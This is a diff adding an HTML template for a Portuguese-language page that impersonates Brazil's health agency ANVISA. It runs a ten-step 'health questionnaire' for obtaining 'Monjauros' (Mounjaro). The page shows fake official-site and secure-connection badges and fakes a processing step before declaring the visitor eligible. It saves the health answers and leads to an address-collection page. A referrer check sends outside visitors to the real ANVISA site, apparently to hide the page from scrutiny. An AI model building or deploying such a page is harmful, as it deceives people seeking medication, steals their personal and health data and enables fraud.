@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>Questionário de Saúde - ANVISA</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <style>
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+      font-weight: 500;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+      font-weight: 600;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+      font-weight: 700;
+      font-style: normal;
+    }
+    
+    body {
+      font-family: 'Rawline', sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 1.4rem;
+      line-height: 2rem;
+      font-weight: 600;
+      color: #0c326f;
+      padding-bottom: 10px;
+      margin: 0;
+    }
+    
+    .subtitle {
+      font-weight: 400;
+      font-size: 16px;
+      color: #555;
+      line-height: normal;
+      margin-bottom: 10px;
+    }
+    
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 1000;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .secure-badge {
+      background-color: #e6f3e6;
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-size: 12px;
+      color: #2e7d32;
+      display: inline-flex;
+      align-items: center;
+      margin-right: 8px;
+    }
+    
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    
+
+    
+    .question-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    
+    .question-header {
+      background-color: #f0f7ff;
+      padding: 20px;
+      border-bottom: 1px solid #e0e7ff;
+    }
+    
+    .progress-bar {
+      height: 8px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      margin-top: 16px;
+      overflow: hidden;
+    }
+    
+    .progress-fill {
+      height: 100%;
+      background-color: #1351b4;
+      width: 0;
+      transition: width 0.5s ease;
+    }
+    
+    .question-content {
+      padding: 30px;
+    }
+    
+    .form-section {
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 30px;
+      transition: all 0.3s ease;
+      border: 1px solid #e5e7eb;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .form-section-active {
+      border-color: #1351b4;
+      box-shadow: 0 4px 12px rgba(19, 81, 180, 0.1);
+    }
+    
+    .form-section.section-is-complete {
+      border-color: #22c55e;
+      box-shadow: 0 4px 12px rgba(34, 197, 94, 0.1);
+    }
+    
+    .form-section.section-is-complete::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 5px;
+      height: 100%;
+      background-color: #22c55e;
+      animation: pulseGreen 2s infinite;
+    }
+    
+    @keyframes pulseGreen {
+      0% { opacity: 0.7; }
+      50% { opacity: 1; }
+      100% { opacity: 0.7; }
+    }
+    
+    .question-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .question-number {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background-color: #1351b4;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      margin-right: 12px;
+    }
+    
+    .option-card {
+      border: 2px solid #e5e7eb;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+    }
+    
+    .option-card:hover {
+      border-color: #bfdbfe;
+      background-color: #f8faff;
+    }
+    
+    .option-card.selected {
+      border-color: #1351b4;
+      background-color: #f0f7ff;
+    }
+    
+    .option-card input[type="radio"],
+    .option-card input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      margin-right: 12px;
+      accent-color: #1351b4;
+    }
+    
+    .option-text {
+      font-size: 16px;
+      color: #333;
+    }
+    
+    .navigation-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+      padding-top: 20px;
+      border-top: 1px solid #e5e7eb;
+    }
+    
+    .btn {
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-weight: 600;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+    }
+    
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+    }
+    
+    .btn-primary:hover {
+      background-color: #0c3d8a;
+    }
+    
+    .btn-secondary {
+      background-color: #f3f4f6;
+      color: #4b5563;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #e5e7eb;
+    }
+    
+    .btn i {
+      margin-right: 8px;
+    }
+    
+    .hidden {
+      display: none;
+    }
+    
+    .section-complete {
+      color: #22c55e;
+      margin-left: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      display: none;
+    }
+    
+    .text-input {
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      padding: 8px 12px;
+      width: 100%;
+      font-size: 16px;
+      margin-top: 8px;
+    }
+    
+    .text-input:focus {
+      border-color: #1351b4;
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(19, 81, 180, 0.2);
+    }
+    
+    .input-group {
+      margin-top: 8px;
+    }
+    
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    
+    /* Estilo para o processo final */
+    .completion-container {
+      text-align: center;
+      padding: 40px 20px;
+    }
+    
+    .completion-icon {
+      font-size: 64px;
+      color: #22c55e;
+      margin-bottom: 16px;
+    }
+    
+    .loader {
+      border: 3px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 3px solid #1351b4;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Questionário de Saúde</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Questionário de Saúde
+      </h2>
+      <p class="subtitle">
+        Complete o questionário para finalizar seu perfil e obter a liberação do Monjauros.
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
+    </div>
+    
+
+    
+    <div class="question-container">
+      <div class="question-header">
+        <h3 class="text-lg font-semibold text-[#0c326f]">Perfil de Saúde</h3>
+        <p class="text-sm text-gray-600">Complete as 10 questões abaixo para obter recomendações personalizadas</p>
+        
+        <div class="progress-bar">
+          <div id="progressFill" class="progress-fill" style="width: 0%"></div>
+        </div>
+        <div class="flex justify-between text-xs text-gray-500 mt-1">
+          <span>Questão <span id="currentQuestionNumber">1</span> de 10</span>
+          <span id="progressPercentage">0%</span>
+        </div>
+      </div>
+      
+      <div class="question-content">
+        <form id="healthForm">
+          <!-- Seção 1: Peso Atual -->
+          <div id="section1" class="form-section form-section-active">
+            <div class="question-title">
+              <span class="question-number">1</span>
+              Peso Atual Aproximado
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="radio" name="peso" value="menos60" required>
+                <span class="option-text">Menos de 60 kg</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="peso" value="60a80">
+                <span class="option-text">60 a 80 kg</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="peso" value="81a100">
+                <span class="option-text">81 a 100 kg</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="peso" value="mais100">
+                <span class="option-text">Mais de 100 kg</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="peso" value="naoInformar">
+                <span class="option-text">Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 2: Altura -->
+          <div id="section2" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">2</span>
+              Altura Aproximada
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="radio" name="altura" value="menos150" required>
+                <span class="option-text">Menos de 1,50 m</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="altura" value="150a165">
+                <span class="option-text">1,50 m a 1,65 m</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="altura" value="166a180">
+                <span class="option-text">1,66 m a 1,80 m</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="altura" value="mais180">
+                <span class="option-text">Mais de 1,80 m</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="altura" value="naoInformar">
+                <span class="option-text">Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 3: Motivo do interesse em obter o Mounjaro -->
+          <div id="section3" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">3</span>
+              Motivo do interesse em obter o Mounjaro
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="checkbox" name="motivoInteresse" value="diabetes">
+                <span class="option-text">Controle de açúcar no sangue (diabetes)</span>
+              </label>
+              <label class="option-card">
+                <input type="checkbox" name="motivoInteresse" value="peso">
+                <span class="option-text">Controle de peso</span>
+              </label>
+              <label class="option-card" id="outroMotivoCard">
+                <input type="checkbox" name="motivoInteresse" value="outro">
+                <span class="option-text">Outro motivo</span>
+              </label>
+              <div class="input-group hidden" id="outroMotivoInput">
+                <input type="text" class="text-input" id="outroMotivoTexto" placeholder="Indique, se quiser">
+              </div>
+              <label class="option-card">
+                <input type="checkbox" name="motivoInteresse" value="naoSei">
+                <span class="option-text">Não sei/Não informado</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 4: Uso de Outros Medicamentos -->
+          <div id="section4" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">4</span>
+              Uso de Outros Medicamentos
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="radio" name="usoMedicamentos" value="sim" required>
+                <span class="option-text">Sim, tomo medicamentos regularmente</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="usoMedicamentos" value="nao">
+                <span class="option-text">Não, não tomo medicamentos</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="usoMedicamentos" value="naoInformar">
+                <span class="option-text">Não sei/Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 5: Condições de Saúde -->
+          <div id="section5" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">5</span>
+              Condições de Saúde Atuais
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="checkbox" name="condicoesSaude" value="diabetes">
+                <span class="option-text">Diabetes</span>
+              </label>
+              <label class="option-card">
+                <input type="checkbox" name="condicoesSaude" value="pressaoAlta">
+                <span class="option-text">Pressão alta</span>
+              </label>
+              <label class="option-card">
+                <input type="checkbox" name="condicoesSaude" value="problemasCoracao">
+                <span class="option-text">Problemas de coração</span>
+              </label>
+              <label class="option-card">
+                <input type="checkbox" name="condicoesSaude" value="nenhuma">
+                <span class="option-text">Nenhuma condição de saúde</span>
+              </label>
+              <label class="option-card" id="outraCondicaoCard">
+                <input type="checkbox" name="condicoesSaude" value="outra">
+                <span class="option-text">Outra</span>
+              </label>
+              <div class="input-group hidden" id="outraCondicaoInput">
+                <input type="text" class="text-input" id="outraCondicaoTexto" placeholder="Indique, se quiser">
+              </div>
+              <label class="option-card">
+                <input type="checkbox" name="condicoesSaude" value="naoInformar">
+                <span class="option-text">Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 6: Atividade Física -->
+          <div id="section6" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">6</span>
+              Atividade Física
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="radio" name="atividadeFisica" value="regular" required>
+                <span class="option-text">Faço exercícios regularmente (ex.: caminhada, academia)</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="atividadeFisica" value="asVezes">
+                <span class="option-text">Faço exercícios às vezes</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="atividadeFisica" value="nao">
+                <span class="option-text">Não faço exercícios</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="atividadeFisica" value="naoInformar">
+                <span class="option-text">Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 7: Hábito Alimentar -->
+          <div id="section7" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">7</span>
+              Hábito Alimentar
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="radio" name="habitoAlimentar" value="dietaMedica" required>
+                <span class="option-text">Sigo uma dieta recomendada por médico ou nutricionista</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="habitoAlimentar" value="tentaSaudavel">
+                <span class="option-text">Tento comer de forma saudável</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="habitoAlimentar" value="naoEspecifica">
+                <span class="option-text">Não sigo uma dieta específica</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="habitoAlimentar" value="naoInformar">
+                <span class="option-text">Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 8: Local de Residência -->
+          <div id="section8" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">8</span>
+              Local de Residência
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="radio" name="localResidencia" value="urbano" required>
+                <span class="option-text">Urbano (cidade grande ou média)</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="localResidencia" value="rural">
+                <span class="option-text">Rural (interior ou zona rural)</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="localResidencia" value="pequenaCidade">
+                <span class="option-text">Pequena cidade</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="localResidencia" value="naoInformar">
+                <span class="option-text">Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 9: Acesso a Farmácias ou Postos de Saúde -->
+          <div id="section9" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">9</span>
+              Acesso a Farmácias ou Postos de Saúde
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="radio" name="acessoFarmacia" value="facil" required>
+                <span class="option-text">Tenho acesso fácil (perto da minha casa)</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="acessoFarmacia" value="distante">
+                <span class="option-text">Tenho acesso, mas é distante</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="acessoFarmacia" value="dificil">
+                <span class="option-text">Não tenho acesso fácil</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="acessoFarmacia" value="naoInformar">
+                <span class="option-text">Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Seção 10: Nível de Escolaridade -->
+          <div id="section10" class="form-section hidden">
+            <div class="question-title">
+              <span class="question-number">10</span>
+              Nível de Escolaridade
+              <span class="section-complete"><i class="fas fa-check-circle"></i> Completo</span>
+            </div>
+            <div class="options-group">
+              <label class="option-card">
+                <input type="radio" name="escolaridade" value="fundamental" required>
+                <span class="option-text">Ensino fundamental ou menos</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="escolaridade" value="medio">
+                <span class="option-text">Ensino médio</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="escolaridade" value="superior">
+                <span class="option-text">Ensino superior</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="escolaridade" value="naoEstudou">
+                <span class="option-text">Não estudei</span>
+              </label>
+              <label class="option-card">
+                <input type="radio" name="escolaridade" value="naoInformar">
+                <span class="option-text">Prefiro não informar</span>
+              </label>
+            </div>
+          </div>
+          
+          <!-- Tela de conclusão -->
+          <div id="completion" class="hidden completion-container">
+            <div class="completion-icon">
+              <i class="fas fa-clipboard-check"></i>
+            </div>
+            <h3 class="text-xl font-bold text-[#0c326f] mb-2">Questionário Concluído!</h3>
+            <p class="text-gray-600 mb-6">Seus dados foram processados com sucesso.</p>
+            
+            <div id="processingMessage" class="bg-blue-50 p-4 rounded-lg mb-6">
+              <p class="text-blue-800 font-medium mb-2">Processando suas informações...</p>
+              <div class="loader"></div>
+            </div>
+            
+            <div id="completionMessage" class="hidden">
+              <div class="bg-green-50 p-6 rounded-lg mb-6 text-left">
+                <h4 class="text-lg font-semibold text-green-800 mb-2">Elegibilidade Confirmada</h4>
+                <p class="text-green-700 mb-4">Você está elegível para aquisição do Monjauros.</p>
+                
+                <div class="border-t border-green-200 pt-4 mt-4">
+                  <p class="text-green-700 font-medium mb-2">Recomendações Personalizadas:</p>
+                  <ul class="text-green-700 list-disc pl-5 space-y-1">
+                    <li>Manter acompanhamento médico regular</li>
+                    <li>Seguir a dosagem prescrita pelo médico</li>
+                    <li>Realizar exames de controle periodicamente</li>
+                    <li>Manter uma alimentação equilibrada</li>
+                  </ul>
+                </div>
+              </div>
+              
+              <button id="continueToPage" type="button" class="btn btn-primary py-3 px-6">
+                <i class="fas fa-check-circle"></i> Preencher Endereço de Recebimento
+              </button>
+            </div>
+          </div>
+          
+          <!-- Botões de navegação -->
+          <div id="navigationButtons" class="navigation-buttons">
+            <button type="button" id="prevButton" class="btn btn-secondary hidden">
+              <i class="fas fa-chevron-left"></i> Anterior
+            </button>
+            <button type="button" id="nextButton" class="btn btn-primary" disabled>
+              Próxima <i class="fas fa-chevron-right"></i>
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+    
+    <div class="bg-white p-4 rounded-lg shadow-sm mt-6">
+      <p class="font-bold text-gray-700 text-base mb-2">
+        <i class="fas fa-shield-alt text-green-600 mr-2"></i>
+        Seus Dados Estão Protegidos
+      </p>
+      <p class="text-gray-700 text-sm">
+        Todas as informações são criptografadas e armazenadas com segurança. Utilizamos seus dados apenas para personalizar recomendações médicas, em conformidade com a Lei Geral de Proteção de Dados (LGPD).
+      </p>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    // Verificação de segurança, permitir acesso apenas a partir da página de validação
+    function checkAccess() {
+      const validReferrers = ['validacao-em-andamento', 'anvisa.gov.br'];
+      const referer = document.referrer;
+      
+      let isValidReferer = false;
+      for (const validRef of validReferrers) {
+        if (referer.includes(validRef)) {
+          isValidReferer = true;
+          break;
+        }
+      }
+      
+      if (!isValidReferer && !localStorage.getItem('cpfValidado')) {
+        window.location.href = "https://www.gov.br/anvisa/pt-br";
+      }
+    }
+    
+
+    
+    let currentSection = 1;
+    const totalSections = 10;
+    
+    // Função para atualizar a barra de progresso
+    function updateProgress() {
+      const progress = ((currentSection - 1) / totalSections) * 100;
+      document.getElementById('progressFill').style.width = `${progress}%`;
+      document.getElementById('progressPercentage').textContent = `${Math.round(progress)}%`;
+      document.getElementById('currentQuestionNumber').textContent = currentSection;
+    }
+    
+    // Função para mostrar uma seção específica
+    function showSection(sectionNumber) {
+      // Esconder todas as seções
+      for (let i = 1; i <= totalSections; i++) {
+        document.getElementById(`section${i}`).classList.add('hidden');
+        document.getElementById(`section${i}`).classList.remove('form-section-active');
+      }
+      
+      // Mostrar a seção atual
+      document.getElementById(`section${sectionNumber}`).classList.remove('hidden');
+      document.getElementById(`section${sectionNumber}`).classList.add('form-section-active');
+      
+      // Atualizar contadores
+      currentSection = sectionNumber;
+      updateProgress();
+      
+      // Mostrar/esconder botões de navegação
+      if (currentSection > 1) {
+        document.getElementById('prevButton').classList.remove('hidden');
+      } else {
+        document.getElementById('prevButton').classList.add('hidden');
+      }
+      
+      // Habilitar/desabilitar botão de próxima
+      checkSectionCompletion(currentSection);
+    }
+    
+    // Verificar se a seção atual está completa (todas as perguntas foram respondidas)
+    function checkSectionCompletion(sectionNumber) {
+      const section = document.getElementById(`section${sectionNumber}`);
+      let isComplete = false;
+      
+      // Verificar se a seção tem perguntas com radio buttons
+      const radioButtons = section.querySelectorAll('input[type="radio"]');
+      if (radioButtons.length > 0) {
+        const radioGroups = {};
+        
+        // Agrupar os radio buttons por nome
+        radioButtons.forEach(radio => {
+          if (!radioGroups[radio.name]) {
+            radioGroups[radio.name] = [];
+          }
+          radioGroups[radio.name].push(radio);
+        });
+        
+        // Verificar se pelo menos um radio de cada grupo está selecionado
+        isComplete = Object.values(radioGroups).every(group => 
+          group.some(radio => radio.checked)
+        );
+      }
+      
+      // Verificar se a seção tem checkboxes (seção de condições de saúde)
+      const checkboxes = section.querySelectorAll('input[type="checkbox"]');
+      if (checkboxes.length > 0) {
+        isComplete = Array.from(checkboxes).some(checkbox => checkbox.checked);
+      }
+      
+      // Atualizar o estado do botão de próxima
+      document.getElementById('nextButton').disabled = !isComplete;
+      
+      // Atualizar visual da seção
+      if (isComplete) {
+        // Esconder o texto "Completo" (vamos usar apenas a borda)
+        section.querySelector('.section-complete').style.display = 'none';
+        
+        // Adicionar classe para mostrar a borda verde com animação
+        section.classList.add('section-is-complete');
+      } else {
+        section.querySelector('.section-complete').style.display = 'none';
+        section.classList.remove('section-is-complete');
+      }
+      
+      return isComplete;
+    }
+    
+    // Navegar para a próxima seção
+    function nextSection() {
+      if (currentSection < totalSections) {
+        showSection(currentSection + 1);
+      } else {
+        finishQuestionnaire();
+      }
+    }
+    
+    // Navegar para a seção anterior
+    function prevSection() {
+      if (currentSection > 1) {
+        showSection(currentSection - 1);
+      }
+    }
+    
+    // Finalizar o questionário
+    function finishQuestionnaire() {
+      // Esconder todas as seções
+      for (let i = 1; i <= totalSections; i++) {
+        document.getElementById(`section${i}`).classList.add('hidden');
+      }
+      
+      // Esconder os botões de navegação
+      document.getElementById('navigationButtons').classList.add('hidden');
+      
+      // Mostrar a tela de conclusão
+      document.getElementById('completion').classList.remove('hidden');
+      
+      // Atualizar a barra de progresso para 100%
+      document.getElementById('progressFill').style.width = '100%';
+      document.getElementById('progressPercentage').textContent = '100%';
+      
+      // Simular processamento e mostrar mensagem de conclusão
+      setTimeout(() => {
+        document.getElementById('processingMessage').classList.add('hidden');
+        document.getElementById('completionMessage').classList.remove('hidden');
+      }, 3000);
+    }
+    
+    // Adicionar eventos aos botões de navegação
+    document.getElementById('nextButton').addEventListener('click', nextSection);
+    document.getElementById('prevButton').addEventListener('click', prevSection);
+    
+    // Avançar para a página de cadastro de endereço
+    document.getElementById('continueToPage').addEventListener('click', function() {
+      // Armazenar respostas do questionário no localStorage para uso posterior
+      const form = document.getElementById('healthForm');
+      const formData = new FormData(form);
+      
+      // Converter FormData para objeto
+      const formDataObject = {};
+      formData.forEach((value, key) => {
+        // Para checkboxes, armazenar valores selecionados em arrays
+        if (formDataObject[key]) {
+          if (!Array.isArray(formDataObject[key])) {
+            formDataObject[key] = [formDataObject[key]];
+          }
+          formDataObject[key].push(value);
+        } else {
+          formDataObject[key] = value;
+        }
+      });
+      
+      // Armazenar no localStorage para uso na página de compra
+      localStorage.setItem('questionarioData', JSON.stringify(formDataObject));
+      
+      // Redirecionar para a página de cadastro de endereço
+      window.location.href = "/endereco";
+    });
+    
+    // Eventos para inputs de texto adicionais
+    document.getElementById('outroMotivoCard').addEventListener('click', function() {
+      document.getElementById('outroMotivoInput').classList.remove('hidden');
+    });
+    
+    document.getElementById('outraCondicaoCard').addEventListener('click', function() {
+      const checkbox = this.querySelector('input[type="checkbox"]');
+      if (checkbox.checked) {
+        document.getElementById('outraCondicaoInput').classList.remove('hidden');
+      } else {
+        document.getElementById('outraCondicaoInput').classList.add('hidden');
+      }
+    });
+    
+    // Eventos para marcar cards quando selecionados
+    document.querySelectorAll('.option-card').forEach(card => {
+      card.addEventListener('click', function() {
+        const input = this.querySelector('input');
+        
+        if (input.type === 'radio') {
+          // Desmarcar todos os cartões no mesmo grupo
+          const name = input.name;
+          document.querySelectorAll(`input[name="${name}"]`).forEach(radio => {
+            radio.closest('.option-card').classList.remove('selected');
+          });
+          
+          // Marcar este cartão
+          this.classList.add('selected');
+        } else if (input.type === 'checkbox') {
+          // Alternar a classe 'selected' para checkboxes
+          this.classList.toggle('selected', input.checked);
+        }
+        
+        // Verificar se a seção está completa
+        checkSectionCompletion(currentSection);
+      });
+    });
+    
+    window.onload = function() {
+      checkAccess();
+      
+      // Mostrar a primeira seção
+      showSection(1);
+      
+      // Adicionar eventos aos inputs de radio e checkbox
+      document.querySelectorAll('input[type="radio"], input[type="checkbox"]').forEach(input => {
+        input.addEventListener('change', () => checkSectionCompletion(currentSection));
+      });
+    }
+    
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
